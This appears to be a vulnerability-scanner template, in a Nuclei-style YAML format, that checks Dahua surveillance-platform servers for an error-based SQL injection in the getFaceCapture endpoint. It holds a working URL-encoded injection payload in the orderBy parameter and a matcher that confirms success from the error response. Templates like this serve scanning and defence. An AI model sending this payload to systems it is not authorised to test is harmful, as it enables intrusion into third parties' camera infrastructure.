id: dahua-getfacecapture-sqli
info:
  name: 大华 getfacecapture 接口 - SQL 注入漏洞
  author: secking
  severity: high
  reference:
    - https://www.dahuatech.com/
  metadata:
    verified: true
    max-request: 1
    vendor: dahua
    product: dahua
  tags: sqli,vuln,dahua
variables:
  rStr3: '{{rand_int(10000, 99999)}}'
http:
  - method: GET
    path:
      - '{{BaseURL}}/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5({{rStr3}})),0x7e),1)--%22%7D/extend/%7B%7D'
    redirects: false
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 500 && contains(body, substr(md5(to_string(rStr3)), 2, 28))'
